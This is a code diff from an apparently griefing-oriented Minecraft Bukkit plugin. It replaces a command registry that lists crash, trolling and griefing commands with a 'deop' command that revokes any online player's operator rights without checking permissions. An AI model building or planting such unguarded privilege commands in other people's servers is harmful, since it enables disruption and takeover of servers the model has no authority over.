@@ -21,39 +21,40 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
-package de.Garkolym.Commands;
+package de.Garkolym.Commands.Server;
 
 import java.util.ArrayList;
 
-import de.Garkolym.Commands.Griefing.CommandUltraCactus;
-import de.Garkolym.Commands.Server.CommandCrash;
-import de.Garkolym.Commands.Server.CommandDEOP;
-import de.Garkolym.Commands.Server.CommandOP;
-import de.Garkolym.Commands.Trolling.CommandGlasVirus;
-import de.Garkolym.Commands.Trolling.CommandKackRegen;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
 
-public class CommandManager {
-	
-	private ArrayList<Command> commandList = new ArrayList<Command>();
-	public ArrayList<Command> getCommandList() {
-		return this.commandList;
+import de.Garkolym.Start;
+import de.Garkolym.Commands.Command;
+import de.Garkolym.Commands.CommandCategory;
+
+public class CommandDEOP extends Command {
+
+	public CommandDEOP() {
+		super("deop", CommandCategory.SERVER);
 	}
-	
-	private void initCommands() {
-		// Server
-		this.getCommandList().add(new CommandOP());
-		this.getCommandList().add(new CommandDEOP());
-		this.getCommandList().add(new CommandCrash());
-		// Trolling
-		this.getCommandList().add(new CommandKackRegen());
-		this.getCommandList().add(new CommandGlasVirus());
-		// Griefing
-		this.getCommandList().add(new CommandUltraCactus());
-		
+
+	@Override
+	public void onCommand(Player p, ArrayList<String> args) {
+		if (args.size() == 0) {
+			p.setOp(false);
+			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Du hast keine OP Rechte mehr!");
+		}
+		else if (args.size() == 1) {
+			try {
+				Player anotherPlayer = Bukkit.getPlayer(args.get(0));
+				anotherPlayer.setOp(false);
+				p.sendMessage(Start.instance.prefix + ChatColor.RED + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.RED + " hat keine OP Rechte mehr!");
+			} catch (Exception e) {
+				p.sendMessage(Start.instance.prefix + ChatColor.RED + "Dieser Spieler ist nicht online!");
+			}
+		}
 	}
-	
-	public CommandManager() {
-		this.initCommands();
-	}
-	
+
+
 }
